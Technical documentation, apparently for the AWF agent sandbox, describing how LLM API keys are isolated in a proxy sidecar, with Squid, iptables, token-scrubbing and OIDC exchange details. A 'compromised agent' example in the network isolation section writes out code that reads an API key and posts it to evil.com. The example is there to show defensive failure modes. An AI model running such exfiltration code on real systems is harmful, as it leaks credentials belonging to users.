---
title: Authentication Architecture
description: How AWF isolates LLM API tokens using a multi-container credential separation architecture.
---

AWF implements a multi-layered security architecture to protect LLM API authentication tokens while providing transparent proxying for AI agent calls. This document explains credential isolation, token exchange, and network routing for every API-proxy provider.

:::note
All LLM providers use the same credential-isolation architecture. API keys are held exclusively in the api-proxy sidecar container (never in the agent container), and all providers route through Squid. The sidecar is a trusted component whose source IP is explicitly exempt from Squid's domain ACLs; the agent allowlist does not constrain sidecar-originated traffic. Providers are differentiated by port number and authentication header format:

| Port  | Provider           | Auth header                     |
|-------|--------------------|---------------------------------|
| 10000 | OpenAI             | `Authorization: Bearer` (static/Azure/GCP), or AWS SigV4 |
| 10001 | Anthropic (Claude) | `x-api-key` (static) or `Authorization: Bearer` (OIDC/WIF) |
| 10002 | GitHub Copilot     | `Authorization: Bearer` or `token`, or AWS SigV4 |
| 10003 | Google Gemini      | `x-goog-api-key` (static key only) |
| 10004 | Google Vertex AI   | `x-goog-api-key` (static key only) |

Only the OpenAI, Anthropic, and Copilot adapters support `AWF_AUTH_TYPE=github-oidc`. Gemini and Vertex AI are static-API-key only in the current implementation. See [`docs/auth-matrix.md`](./auth-matrix.md) for the full per-provider auth matrix, including the enterprise/business Copilot `token`-prefix requirement and AWS OIDC SigV4 support for Bedrock Runtime.
:::

## Architecture components

AWF uses a **3-container architecture**. The API proxy sidecar is always enabled (see [Configuration requirements](#configuration-requirements) below):

1. **Squid Proxy Container** (`172.30.0.10`) — L7 HTTP/HTTPS domain filtering
2. **API Proxy Sidecar Container** (`172.30.0.30`) — credential injection and isolation
3. **Agent Execution Container** (`172.30.0.20`) — user command execution environment

```
┌─────────────────────────────────────────────────────────────────┐
│ HOST MACHINE                                                     │
│                                                                  │
│  AWF CLI reads environment:                                      │
│  - ANTHROPIC_API_KEY=sk-ant-...                                 │
│  - OPENAI_API_KEY=sk-...                                        │
│                                                                  │
│  Passes keys only to api-proxy container                         │
└────────────────────┬─────────────────────────────────────────────┘
                     │
                     ├─────────────────────────────────────┐
                     │                                     │
                     ▼                                     ▼
┌──────────────────────────────────┐       ┌──────────────────────────────────┐
│ API Proxy Container              │       │ Agent Container                  │
│ 172.30.0.30                      │       │ 172.30.0.20                      │
│                                  │       │                                  │
│ Environment:                     │       │ Environment:                     │
│ ✓ OPENAI_API_KEY=sk-...         │       │ ✗ No ANTHROPIC_API_KEY          │
│ ✓ ANTHROPIC_API_KEY=sk-ant-...  │       │ ✓ OPENAI_API_KEY=                │
│                                  │       │   sk-placeholder-for-api-proxy   │
│ ✓ HTTP_PROXY=172.30.0.10:3128   │       │ ✓ ANTHROPIC_BASE_URL=            │
│ ✓ HTTPS_PROXY=172.30.0.10:3128  │       │     http://172.30.0.30:10001    │
│                                  │       │ ✓ OPENAI_BASE_URL=               │
│ Ports:                           │       │     http://172.30.0.30:10000    │
│ - 10000 (OpenAI proxy)          │◄──────│ ✓ COPILOT_API_URL=               │
│ - 10001 (Anthropic proxy)       │       │     http://172.30.0.30:10002    │
│ - 10002 (Copilot proxy)         │       │ ✗ GITHUB_TOKEN — excluded        │
│ - 10003 (Gemini proxy)          │       │   (not present in agent env)     │
│ - 10004 (Vertex AI proxy)       │       │                                  │
│ Injects auth headers:            │       │ User command execution:          │
│ - x-api-key: sk-ant-...         │       │   claude-code, copilot, etc.     │
│ - Authorization: Bearer sk-...   │       └──────────────────────────────────┘
└────────────────┬─────────────────┘
                 │
                 ▼
┌──────────────────────────────────┐
│ Squid Proxy Container            │
│ 172.30.0.10:3128                 │
│                                  │
│ Trusted api-proxy source:        │
│ ✓ Routed through Squid          │
│ ✓ Exempt from domain ACLs       │
│   (unrestricted outbound)       │
│                                  │
└────────────────┬─────────────────┘
                 │
                 ▼
         Internet (api.anthropic.com)
```

## Token flow: step by step

### 1. Token sources and initial handling

**Source:** `src/cli.ts`

The API proxy is always active. Set source credentials in the host environment before invoking AWF:

```bash
export ANTHROPIC_API_KEY="sk-ant-..."
export OPENAI_API_KEY="sk-..."

sudo awf --allow-domains api.anthropic.com \
  "claude-code --prompt 'write hello world'"
```

The CLI reads API keys from the **host environment** at startup and passes them to the Docker Compose configuration.

### 2. Docker Compose configuration

**Source:** `src/docker-manager.ts`

AWF generates a Docker Compose configuration with three services:

#### API proxy service configuration

```yaml
api-proxy:
  environment:
    # API keys passed ONLY to this container
    - ANTHROPIC_API_KEY=sk-ant-...
    - OPENAI_API_KEY=sk-...
    # Routes all traffic through Squid
    - HTTP_PROXY=http://172.30.0.10:3128
    - HTTPS_PROXY=http://172.30.0.10:3128
  networks:
    awf-net:
      ipv4_address: 172.30.0.30
```

#### Agent service configuration

```yaml
agent:
  environment:
    # No real API keys: only proxy URLs and non-secret compatibility placeholders
    - ANTHROPIC_BASE_URL=http://172.30.0.30:10001
    - OPENAI_BASE_URL=http://172.30.0.30:10000
    - OPENAI_API_KEY=sk-placeholder-for-api-proxy
    - CODEX_API_KEY=sk-placeholder-for-api-proxy
    - COPILOT_API_URL=http://172.30.0.30:10002
    - GOOGLE_GEMINI_BASE_URL=http://172.30.0.30:10003
    - GEMINI_API_BASE_URL=http://172.30.0.30:10003
    - GOOGLE_VERTEX_BASE_URL=http://172.30.0.30:10004
    # GITHUB_TOKEN / GH_TOKEN are NOT present — excluded by the API-proxy
    # exclusion set to prevent credential extraction via /proc/self/environ
  networks:
    awf-net:
      ipv4_address: 172.30.0.20
```

:::danger[Security design]
Real API credentials are intentionally excluded from the agent container environment. The API proxy is always enabled. Source values such as `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, and `ANTHROPIC_AUTH_TOKEN` are excluded before AWF adds any non-secret compatibility placeholders required by client tools. For example, the agent receives `OPENAI_API_KEY=sk-placeholder-for-api-proxy` and `ANTHROPIC_AUTH_TOKEN=sk-ant-placeholder-key-for-credential-isolation`, never the host values.
:::

### 3. API proxy: credential injection layer

**Source:** `containers/api-proxy/server.js` (facade), `containers/api-proxy/server-factory.js` (shared HTTP handler logic), `containers/api-proxy/providers/*.js` (one adapter module per provider)

The api-proxy container runs five HTTP servers, one per provider adapter:

#### Port 10000: OpenAI proxy

Simplified illustration of the request-handling logic (the real implementation lives in `providers/openai.js` and `server-factory.js`, and is provider-agnostic — this snippet is illustrative, not a literal excerpt):

```javascript
// Stripped headers — never forwarded from client (containers/api-proxy/proxy-utils.js)
const STRIPPED_HEADERS = new Set([
  'host', 'authorization', 'proxy-authorization',
  'x-api-key', 'x-goog-api-key', 'forwarded', 'via',
]);
// Header names starting with 'x-forwarded-' are also stripped.

// OpenAI proxy handler
http.createServer((req, res) => {
  proxyRequest(req, res, 'api.openai.com', {
    'Authorization': `Bearer ${OPENAI_API_KEY}`,
  });
});
```

#### Port 10001: Anthropic proxy

```javascript
// Anthropic proxy handler
http.createServer((req, res) => {
  const anthropicHeaders = { 'x-api-key': ANTHROPIC_API_KEY };
  // Only set anthropic-version as default; preserve agent-provided version
  if (!req.headers['anthropic-version']) {
    anthropicHeaders['anthropic-version'] = '2023-06-01';
  }
  proxyRequest(req, res, 'api.anthropic.com', anthropicHeaders);
});
```

In OIDC mode (`AWF_AUTH_TYPE=github-oidc`, `AWF_AUTH_PROVIDER=anthropic`), the sidecar injects the exchanged OAuth access token in the `Authorization` header instead of `x-api-key`.

#### Port 10002: GitHub Copilot proxy

Handles requests from the agent using `COPILOT_API_URL`. Injects the resolved Copilot auth token (`COPILOT_GITHUB_TOKEN`), forwarding to `api.githubcopilot.com`. The optional `COPILOT_PROVIDER_API_KEY` provides BYOK upstream auth (e.g. Azure OpenAI, OpenRouter).

#### Port 10003: Google Gemini proxy

Handles requests from the agent using `GOOGLE_GEMINI_BASE_URL` (read by the Gemini CLI) and `GEMINI_API_BASE_URL` (read by older SDK versions). Injects `x-goog-api-key` from `GEMINI_API_KEY`, forwarding to `generativelanguage.googleapis.com`. Returns `503` if `GEMINI_API_KEY` is not configured. Static-key only — no OIDC/WIF support.

#### Port 10004: Google Vertex AI proxy

Handles requests from the agent using `GOOGLE_VERTEX_BASE_URL` (read by the Gemini CLI when `GOOGLE_GENAI_USE_VERTEXAI=true`). Injects `x-goog-api-key` from `GOOGLE_API_KEY`, forwarding to `aiplatform.googleapis.com`. Returns `503` if `GOOGLE_API_KEY` is not configured. Shares its adapter factory (`providers/google-adapter.js`) with the Gemini adapter, but is a distinct always-bound port with its own target and env vars. Static-key only — no OIDC/WIF support (see [`docs/auth-matrix.md`](./auth-matrix.md#provider-google-vertex-ai) for the implementation-vs-provider-docs caveat on API-key auth against Vertex AI).

The `proxyRequest` function copies incoming headers, strips sensitive/proxy headers, injects the authentication headers, and forwards the request to the target API through Squid using `HttpsProxyAgent`.

:::caution
The proxy strips any authentication headers sent by the agent and only uses the key from its own environment. This prevents a compromised agent from injecting malicious credentials.
:::

### 4. Agent container: SDK transparent redirection

The agent container sees these environment variables:

```bash
ANTHROPIC_BASE_URL=http://172.30.0.30:10001
OPENAI_BASE_URL=http://172.30.0.30:10000
COPILOT_API_URL=http://172.30.0.30:10002
GOOGLE_GEMINI_BASE_URL=http://172.30.0.30:10003
GEMINI_API_BASE_URL=http://172.30.0.30:10003
GOOGLE_VERTEX_BASE_URL=http://172.30.0.30:10004
```

These are standard environment variables recognized by the official SDKs:
- Anthropic Python SDK (`anthropic`)
- Anthropic TypeScript SDK (`@anthropic-ai/sdk`)
- OpenAI Python SDK (`openai`)
- OpenAI Node.js SDK (`openai`)
- Claude Code CLI
- Codex CLI
- GitHub Copilot CLI (`gh copilot`)
- Google Gemini CLI (reads `GOOGLE_GEMINI_BASE_URL`, or `GOOGLE_VERTEX_BASE_URL` when `GOOGLE_GENAI_USE_VERTEXAI=true`)

When the agent code makes an API call:

**Example 1: Anthropic/Claude**

```python
import anthropic

client = anthropic.Anthropic()
# SDK reads ANTHROPIC_BASE_URL from environment
# Sends request to http://172.30.0.30:10001 instead of api.anthropic.com

response = client.messages.create(
    model="claude-sonnet-4",
    messages=[{"role": "user", "content": "Hello"}]
)
```

**Example 2: OpenAI/Codex**

```python
import openai

client = openai.OpenAI()
# SDK reads OPENAI_BASE_URL from environment
# Sends request to http://172.30.0.30:10000 instead of api.openai.com

response = client.chat.completions.create(
    model="gpt-4",
    messages=[{"role": "user", "content": "Hello"}]
)
```

The SDKs automatically use the base URL without requiring any code changes.

### 5. Network routing: iptables rules

**Source:** `containers/agent/setup-iptables.sh`

Special iptables rules ensure proper routing for the api-proxy:

```bash
# Allow direct access to api-proxy (bypass NAT redirection)
if [ -n "$AWF_API_PROXY_IP" ]; then
  iptables -t nat -A OUTPUT -d "$AWF_API_PROXY_IP" -j RETURN
fi

# Accept TCP traffic to api-proxy
iptables -A OUTPUT -p tcp -d "$AWF_API_PROXY_IP" -j ACCEPT
```

Without the NAT `RETURN` rule, traffic to `172.30.0.30` would be redirected to Squid via the DNAT rules, creating a routing loop.

**Traffic flow for Anthropic/Claude:**

1. Agent SDK makes HTTP request to `172.30.0.30:10001`
2. iptables allows direct TCP connection (NAT `RETURN` rule)
3. API proxy receives request on port 10001
4. API proxy injects `x-api-key: sk-ant-...` header
5. API proxy forwards to `api.anthropic.com` via Squid (using `HttpsProxyAgent`)
6. Squid recognizes the trusted api-proxy source IP and bypasses domain ACL evaluation
7. Squid forwards to real API endpoint
8. Response flows back: API → Squid → api-proxy → agent

**Traffic flow for OpenAI/Codex:**

1. Agent SDK makes HTTP request to `172.30.0.30:10000`
2. iptables allows direct TCP connection (NAT `RETURN` rule)
3. API proxy receives request on port 10000
4. API proxy injects `Authorization: Bearer sk-...` header
5. API proxy forwards to `api.openai.com` via Squid (using `HttpsProxyAgent`)
6. Squid recognizes the trusted api-proxy source IP and bypasses domain ACL evaluation
7. Squid forwards to real API endpoint
8. Response flows back: API → Squid → api-proxy → agent

### 6. Squid proxy routing and trusted sidecar exemption

The api-proxy container routes all outbound traffic through Squid via its `HTTP_PROXY`/`HTTPS_PROXY` environment variables:

```yaml
environment:
  HTTP_PROXY: http://172.30.0.10:3128
  HTTPS_PROXY: http://172.30.0.10:3128
```

Squid routes the sidecar's outbound HTTP/HTTPS connections, but it does not apply the agent domain allowlist to them. `generateApiProxySection()` adds `http_access allow from_api_proxy` before domain ACL evaluation because OIDC exchanges and custom API targets may not appear in the agent allowlist. The api-proxy is therefore part of AWF's trusted computing base and has unrestricted outbound HTTP/HTTPS access through Squid. A compromised sidecar is not contained by the domain allowlist.

:::note
The api-proxy connects to the real APIs (e.g., `api.openai.com`) over standard HTTPS (port 443) through Squid. Ports 10000–10004 are only used for internal agent-to-proxy communication within the Docker network.
:::

## Additional token protection mechanisms

### One-shot token library

**Source:** `containers/agent/one-shot-token/`

While real provider keys do not exist in the agent container, non-secret compatibility placeholders and other tokens may still be present. AWF uses an `LD_PRELOAD` library as defense-in-depth for protected variable names:

```c
// Intercept getenv() calls
char* getenv(const char* name) {
  if (is_protected_token(name)) {
    // First access: return value and cache it
    char* value = real_getenv(name);
    if (value) {
      cache_token(name, value);
      unsetenv(name);  // Remove from environment
    }
    return value;
  }
  return real_getenv(name);
}

// Subsequent accesses return cached value
// /proc/self/environ no longer shows the token
```

**Protected tokens by default:**
- `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `CLAUDE_API_KEY` (`ANTHROPIC_AUTH_TOKEN` contains AWF's placeholder when Anthropic proxying is configured)
- `OPENAI_API_KEY`, `OPENAI_KEY`
- `GITHUB_TOKEN`, `GH_TOKEN`, `COPILOT_GITHUB_TOKEN` (source values are excluded; Copilot may receive a placeholder)
- `GITHUB_API_TOKEN`, `GITHUB_PAT`, `GH_ACCESS_TOKEN`
- `CODEX_API_KEY`
- `COPILOT_PROVIDER_API_KEY` (Copilot BYOK upstream provider key)

### Entrypoint token cleanup

**Source:** `containers/agent/entrypoint.sh`

The entrypoint (PID 1) runs the agent command in the background, then unsets sensitive tokens from its own environment after a brief grace period (up to 1 second, polling every 100ms):

```bash
unset_sensitive_tokens() {
  local SENSITIVE_TOKENS=(
    "COPILOT_GITHUB_TOKEN" "GITHUB_TOKEN" "GH_TOKEN"
    "GITHUB_API_TOKEN" "GITHUB_PAT" "GH_ACCESS_TOKEN"
    "GITHUB_PERSONAL_ACCESS_TOKEN"
    "OPENAI_API_KEY" "OPENAI_KEY"
    "ANTHROPIC_API_KEY" "ANTHROPIC_AUTH_TOKEN" "CLAUDE_API_KEY" "CLAUDE_CODE_OAUTH_TOKEN"
    "CODEX_API_KEY"
    "COPILOT_PROVIDER_API_KEY"
  )

  for token in "${SENSITIVE_TOKENS[@]}"; do
    if [ -n "${!token}" ]; then
      unset "$token"
    fi
  done
}

# Run agent in background, wait for it to cache tokens, then unset
capsh --drop=cap_net_admin -- -c "exec gosu awfuser $COMMAND" &
AGENT_PID=$!
# Poll every 100ms for up to 1s; exit early if agent finishes
for _i in 1 2 3 4 5 6 7 8 9 10; do
  kill -0 "$AGENT_PID" 2>/dev/null || break
  sleep 0.1
done
unset_sensitive_tokens
wait $AGENT_PID
```

This prevents tokens from being visible in `/proc/1/environ` after the agent starts.

## Security properties

### Credential isolation

**Primary security guarantee:** API keys **never exist** in the agent container environment.

- Agent code cannot read API keys via `getenv()` or `os.getenv()`
- API keys are not visible in `/proc/self/environ` or `/proc/*/environ`
- Compromised agent code cannot exfiltrate API keys (they don't exist)
- Only the api-proxy container has access to API keys

### Network isolation

**Defense in depth:**

1. **Layer 1:** Agent cannot make direct internet connections (iptables blocks non-whitelisted traffic)
2. **Layer 2:** Agent can only reach api-proxy IP (`172.30.0.30`) for API calls
3. **Layer 3:** API proxy routes outbound HTTP/HTTPS through Squid (enforced via `HTTP_PROXY` env)
4. **Layer 4:** Squid enforces the domain allowlist for agent-originated traffic; the trusted api-proxy source IP is explicitly exempt
5. **Layer 5:** Host-level iptables provide additional egress control

**Attack scenario: what if the agent tries to bypass the proxy?**

```python
# Compromised agent tries to exfiltrate API key
import os, requests

# Attempt 1: Try to read API key
api_key = os.getenv("ANTHROPIC_API_KEY")
# Result: None (key doesn't exist in agent environment)

# Attempt 2: Try to connect to malicious domain
requests.post("https://evil.com/exfiltrate", data={"key": api_key})
# Result: iptables blocks connection (evil.com not in whitelist)

# Attempt 3: Try to bypass Squid
import socket
sock = socket.socket()
sock.connect(("evil.com", 443))
# Result: iptables blocks connection (must go through Squid)
```

All attempts fail due to the multi-layered defense.

### Capability restrictions

**API proxy container:**

```yaml
security_opt:
  - no-new-privileges:true
cap_drop:
  - ALL
mem_limit: 512m
pids_limit: 100
```

Even if exploited, the api-proxy has no elevated privileges and limited resources.

**Agent container:**

- Starts with `CAP_NET_ADMIN` (and `CAP_SYS_ADMIN`, `CAP_SYS_CHROOT` in chroot mode) for iptables and filesystem setup
- Drops these capabilities via `capsh --drop=...` before executing the user command
- Prevents malicious code from modifying firewall rules

## Configuration requirements

### API proxy behavior

:::note[Implementation vs. provider documentation]
The API proxy is **always enabled** — it cannot be turned off. The historical `--enable-api-proxy` CLI flag is deprecated and ignored (kept only for backward-compatible command lines), and `--no-enable-api-proxy` is rejected as a runtime error. The `apiProxy.enabled` config-file field is likewise deprecated and ignored. Do not add `--enable-api-proxy` to new commands.
:::

**Example 1: Using with Claude Code**

```bash
export ANTHROPIC_API_KEY="sk-ant-api03-..."

sudo awf \
    --allow-domains api.anthropic.com \
    "claude-code --prompt 'Hello world'"
```

**Example 2: Using with Codex**

```bash
export OPENAI_API_KEY="sk-..."

sudo awf \
    --allow-domains api.openai.com \
    "codex --prompt 'Hello world'"
```

**Example 3: Using both providers**

```bash
export ANTHROPIC_API_KEY="sk-ant-api03-..."
export OPENAI_API_KEY="sk-..."

sudo awf \
    --allow-domains api.anthropic.com,api.openai.com \
    "your-multi-llm-agent"
```

### Provider domains and the agent allowlist

Provider domains may still be listed to express the intended network policy:

```bash
--allow-domains api.anthropic.com,api.openai.com
```

This allowlist constrains agent-originated traffic, not the api-proxy. The trusted sidecar source IP bypasses Squid's domain ACLs, so these entries are not an egress boundary for sidecar requests.

### NO_PROXY configuration

**Source:** `src/docker-manager.ts`

The agent container's `NO_PROXY` variable includes the api-proxy IP so that agent-to-proxy communication bypasses Squid:

```bash
NO_PROXY=localhost,127.0.0.1,172.30.0.30
```

This ensures:
- Local MCP servers (stdio-based) can communicate via localhost
- The agent can reach api-proxy directly without going through Squid
- Container-to-container communication works properly

## Why credential isolation matters

### Hypothetical direct authentication

AWF does not provide this mode. The diagram shows the risk that the always-on sidecar avoids:

```
┌─────────────────┐
│ Agent Container │
│                 │
│ Environment:    │
│ ✓ ANTHROPIC_API_KEY=sk-ant-... (VISIBLE)
│                 │
│ Risk: Token     │
│ visible in      │
│ /proc/environ   │
└────────┬────────┘
         │
         ▼
    Squid Proxy
         │
         ▼
  api.anthropic.com
```

**Security risk:** If the agent is compromised, the attacker can read the API key from environment variables.

### AWF API proxy (credential isolation)

```
┌─────────────────┐     ┌────────────────┐
│ Agent Container │────▶│ API Proxy      │
│                 │     │                │
│ Environment:    │     │ Environment:   │
│ ✗ No API key    │     │ ✓ ANTHROPIC_API_KEY=sk-ant-...
│ ✓ BASE_URL=     │     │ (ISOLATED)     │
│   172.30.0.30   │     │                │
└─────────────────┘     └────────┬───────┘
                                 │
                                 ▼
                            Squid Proxy
                                 │
                                 ▼
                          api.anthropic.com
```

**Security improvement:** A compromised agent cannot access API keys — they don't exist in the agent environment.

## OIDC authentication (keyless credential exchange)

AWF also supports **keyless authentication** via GitHub Actions OIDC workload identity federation. Instead of static API keys, the api-proxy sidecar exchanges a short-lived GitHub-issued JWT for provider-specific credentials. The Actions token-minting variables, minted JWT, and exchanged credentials remain outside the agent container.

### How native GitHub Actions OIDC works

In a standard GitHub Actions workflow (without AWF), OIDC federation works like this:

```
┌──────────────────────────────────────────────────────────┐
│ GitHub Actions Runner                                     │
│                                                          │
│ 1. Workflow declares permissions: id-token: write        │
│    → Runner injects:                                     │
│      ACTIONS_ID_TOKEN_REQUEST_URL                        │
│      ACTIONS_ID_TOKEN_REQUEST_TOKEN                      │
│                                                          │
│ 2. Agent code calls ACTIONS_ID_TOKEN_REQUEST_URL         │
│    with audience claim                                   │
│    → GitHub mints short-lived JWT                        │
│    → JWT contains: repo, ref, actor, workflow claims     │
│                                                          │
│ 3. Agent code sends JWT to cloud provider STS            │
│    → Azure: login.microsoftonline.com/.../token          │
│    → AWS:   sts.amazonaws.com (AssumeRoleWithWebIdentity)│
│    → GCP:   sts.googleapis.com/v1/token                  │
│    → Provider validates JWT via GitHub OIDC discovery     │
│    → Returns provider-specific credentials               │
│                                                          │
│ 4. Agent code uses credentials directly                  │
│    → Bearer token (Azure/GCP)                            │
│    → SigV4 signing (AWS)                                 │
│                                                          │
│ ⚠ Problem: Agent holds real cloud credentials            │
└──────────────────────────────────────────────────────────┘
```

**Security concern:** Even though OIDC avoids static API keys, the agent still receives the exchanged cloud credentials. A compromised agent could exfiltrate the token.

### How AWF OIDC works (credential isolation)

AWF keeps the Actions OIDC request capability, minted GitHub JWT, and exchanged cloud credential in the api-proxy sidecar:

```
┌─────────────────────────────┐     ┌───────────────────────────────────────┐
│ Agent Container             │     │ API Proxy Sidecar                     │
│ 172.30.0.20                 │     │ 172.30.0.30                           │
│                             │     │                                       │
│ Environment:                │     │ Environment:                          │
│ ✗ No Actions OIDC request   │     │ ✓ ACTIONS_ID_TOKEN_REQUEST_URL        │
│   capability                │     │ ✓ ACTIONS_ID_TOKEN_REQUEST_TOKEN      │
│ ✗ No cloud credentials      │     │ ✓ Provider-specific configuration     │
│ ✗ No API keys               │     │ ✓ AWF_AUTH_TYPE=github-oidc           │
│ ✓ OPENAI_BASE_URL=          │     │ ✓ AWF_AUTH_PROVIDER=azure|aws|gcp|anthropic │
│   http://172.30.0.30:10000  │     │ ✓ Provider-specific config            │
│                             │     │                                       │
│ Agent sends request:        │     │ On startup:                           │
│ POST /v1/chat/completions   │     │ 1. Mint GitHub OIDC JWT               │
│ (no auth headers)    ──────────►  │ 2. Exchange JWT for cloud credential  │
│                             │     │ 3. Cache + auto-refresh at 75%        │
│                             │     │                                       │
│                             │     │ On each request:                      │
│                             │     │ 4. Inject auth header/signature       │
│                             │     │ 5. Forward via Squid ─────────────►   │
│ ◄── response ───────────────│     │                                       │
└─────────────────────────────┘     └───────────────────────────────────────┘
                                                    │
                                                    ▼
                                              Squid Proxy
                                              172.30.0.10
                                                    │
                                                    ▼
                                          Cloud API endpoint
                            (Azure OpenAI, GCP-fronted OpenAI/Copilot targets,
                             Anthropic, and AWS Bedrock Runtime)
```

### OIDC token flow: step by step

#### Step 1: Configuration forwarding

The AWF CLI forwards `AWF_AUTH_*` configuration and the Actions runtime OIDC request URL and token only to the api-proxy sidecar. `buildOidcEnv()` conditionally adds the runtime variables to the sidecar in `github-oidc` mode, while `buildExclusionSet()` prevents every agent environment input path from adding them.

```
Host environment                    Sidecar container          Agent container
─────────────────                   ─────────────────          ───────────────
AWF_AUTH_TYPE=github-oidc    ──►    AWF_AUTH_TYPE ✓            ✗ (excluded)
AWF_AUTH_PROVIDER=azure      ──►    AWF_AUTH_PROVIDER ✓        ✗ (excluded)
AWF_AUTH_AZURE_TENANT_ID=... ──►    AWF_AUTH_AZURE_TENANT_ID ✓ ✗ (excluded)
ACTIONS_ID_TOKEN_REQUEST_URL ──►    forwarded when type=oidc ✓ ✗ (excluded)
```

:::note[OIDC-authenticated MCP servers]
GitHub Agentic Workflows supports `auth.type: github-oidc` for remote HTTP MCP servers through its compiler-managed MCP gateway. The generated **Start MCP Gateway** workflow step runs on the Actions runner before the AWF agent, passes the Actions variables directly to the gateway, and supplies only the gateway endpoint to the agent. The gateway mints an audience-bound JWT and injects it into the remote MCP request. AWF does not launch or configure the gateway.

Lock files generated by compiler versions that do not pass the variables directly from the runner to the gateway must be recompiled. [github/gh-aw#50053](https://github.com/github/gh-aw/issues/50053) is resolved: [github/gh-aw#50054](https://github.com/github/gh-aw/pull/50054) enforces the runner-to-gateway path, requires `permissions.id-token: write` for HTTP MCP `github-oidc` servers, and hardens the AWF exclude-env boundary; recompile any lock file predating that change.
:::

#### Step 2: GitHub OIDC token minting

The sidecar's token provider (`github-oidc.js`) calls `ACTIONS_ID_TOKEN_REQUEST_URL` with a provider-appropriate audience claim:

| Provider | Default audience | Token minting source |
|----------|-----------------|---------------------|
| Azure | `api://AzureADTokenExchange` | `github-oidc.js` |
| AWS | `sts.amazonaws.com` | `github-oidc.js` |
| GCP | Workload Identity Provider resource name | `github-oidc.js` |
| Anthropic | `https://api.anthropic.com` | `github-oidc.js` |

This step is identical across all providers — only the audience differs.

#### Step 3: Provider-specific token exchange

Each provider has its own token exchanger that converts the GitHub JWT into usable credentials:

**Azure** (`oidc-token-provider.js`):
```
GitHub JWT  ──►  login.microsoftonline.com/{tenant}/oauth2/v2.0/token
                 grant_type=client_credentials
                 client_assertion_type=jwt-bearer
                 client_assertion={github_jwt}
            ◄──  { access_token: "eyJ...", expires_in: 3600 }
```

**AWS** (`aws-oidc-token-provider.js`):
```
GitHub JWT  ──►  sts.{region}.amazonaws.com/?Action=AssumeRoleWithWebIdentity
                 RoleArn={role_arn}
                 WebIdentityToken={github_jwt}
            ◄──  { AccessKeyId, SecretAccessKey, SessionToken, Expiration }
```

**GCP** (`gcp-oidc-token-provider.js`):
```
GitHub JWT  ──►  sts.googleapis.com/v1/token
                 grant_type=token-exchange
                 subject_token={github_jwt}
            ◄──  { access_token: "ya29...", expires_in: 3600 }

(Optional)  ──►  iamcredentials.googleapis.com/.../generateAccessToken
                 Authorization: Bearer {federated_token}
            ◄──  { accessToken: "ya29...", expireTime: "..." }
```

**Anthropic** (`anthropic-oidc-token-provider.js`):
```
GitHub JWT  ──►  api.anthropic.com/v1/oauth/token
                grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer
                assertion={github_jwt}
                anthropic-beta=oauth-2025-04-20,oidc-federation-2026-04-01
            ◄──  { access_token: "sk-ant-oat01-...", expires_in: 3600 }
```

The federation beta is a routing switch used only for the JWT-bearer exchange. It is not added to static-key requests, forwarded refresh-token exchanges, or subsequent API calls. See Anthropic's [WIF documentation](https://platform.claude.com/docs/en/manage-claude/workload-identity-federation) and [TypeScript SDK exchange implementation](https://github.com/anthropics/anthropic-sdk-typescript/blob/3b45cd3b69c956ac63384fdb09ce1d8109f3fa80/src/lib/credentials/oidc-federation.ts).

#### Step 4: Credential caching and auto-refresh

All token providers cache the exchanged credentials and schedule proactive refresh:

- **Refresh timing:** `min(lifetime × 0.75, lifetime − 300s)`
- **Background refresh:** Non-blocking timer (`setTimeout` with `.unref()`)
- **Retry on failure:** Exponential backoff with configurable delay
- **Graceful degradation:** Returns `null` if no valid token; upstream gets 503

#### Step 5: Auth header injection

When the agent sends a request to the sidecar, the provider adapter injects the appropriate credentials:

| Provider | Auth injection method |
|----------|----------------------|
| Azure | `Authorization` header |
| GCP | `Authorization` header |
| Anthropic | `Authorization: Bearer` plus `anthropic-beta: oauth-2025-04-20` |
| AWS | SigV4 `Authorization`, `x-amz-date`, payload hash, and STS session token |

For Anthropic bearer requests, AWF merges the OAuth beta with client-supplied `anthropic-beta` values and the optional auto-cache beta, deduplicating exact values. Static `x-api-key` requests do not receive OAuth or federation beta values.

:::note[AWS OIDC requests are signed at final dispatch]
`AwsOidcTokenProvider` keeps `AccessKeyId`, `SecretAccessKey`, and `SessionToken` inside the sidecar. After all URL and body transforms, the request layer signs the method, canonical path/query, final body hash, regional Bedrock Runtime host, and `bedrock-runtime` service with Node's built-in cryptography. Retries are re-signed, expired or unavailable credentials produce `503` without contacting upstream, and signing is restricted to `bedrock-runtime.<region>.amazonaws.com` (or the corresponding China endpoint).
:::

### MCP gateway OIDC is a separate trust path

For an HTTP MCP server configured with `auth.type: github-oidc`, gh-aw starts mcpg in a runner-owned workflow step. The runner supplies the Actions OIDC variables directly to that gateway; the gateway mints an audience-bound JWT and injects it into the remote MCP request. AWF does not launch or configure mcpg, and its API proxy is not involved in that flow.

The generated gateway configuration should contain only auth type/audience metadata, never the Actions request URL/token values. Do not expose those variables to the AWF agent as an MCP authentication workaround. [github/gh-aw#50053](https://github.com/github/gh-aw/issues/50053) is resolved by [github/gh-aw#50054](https://github.com/github/gh-aw/pull/50054), which enforces this boundary and requires `permissions.id-token: write` for HTTP MCP `github-oidc` servers.

### Comparison: static keys vs OIDC

| Property | Static API keys | OIDC federation |
|----------|----------------|-----------------|
| Credential type | Long-lived secret | Short-lived token (~1h) |
| Rotation | Manual | Automatic (proactive refresh) |
| Agent sees credential material | No real provider key | No Actions OIDC request token, minted JWT, or exchanged provider credential |
| GitHub Actions requirement | API key in secrets | `permissions: id-token: write` |
| Cloud provider setup | Generate API key | Configure trust policy/federation |
| Supported providers | OpenAI, Anthropic, Copilot, Gemini, Vertex AI | Azure (OpenAI/Copilot), GCP (OpenAI/Copilot adapters only — not the native Vertex/Gemini adapters), Anthropic WIF, AWS Bedrock Runtime via OpenAI/Copilot adapters |

### Configuration reference

OIDC authentication is configured via `apiProxy.auth` in the AWF config file or via `AWF_AUTH_*` environment variables. See:

- [AWF Config Spec §9.5](./awf-config-spec.md#95-oidc-authentication) — normative specification
- [API Proxy Sidecar: OIDC Authentication](./api-proxy-sidecar.md#oidc-authentication) — usage guide with examples
- [AWF Config Schema](./awf-config.schema.json) — machine-readable JSON Schema

## Key files reference

| File | Purpose |
|------|---------|
| `src/cli.ts` | CLI reads API keys from host environment |
| `src/docker-manager.ts` | Docker Compose generation, token routing, env var exclusion |
| `src/services/api-proxy-service.ts` | Env var forwarding to sidecar (including `AWF_AUTH_*` OIDC vars) |
| `containers/api-proxy/server.js` | API proxy implementation (credential injection, header stripping) |
| `containers/api-proxy/github-oidc.js` | Shared GitHub Actions OIDC token minting utility |
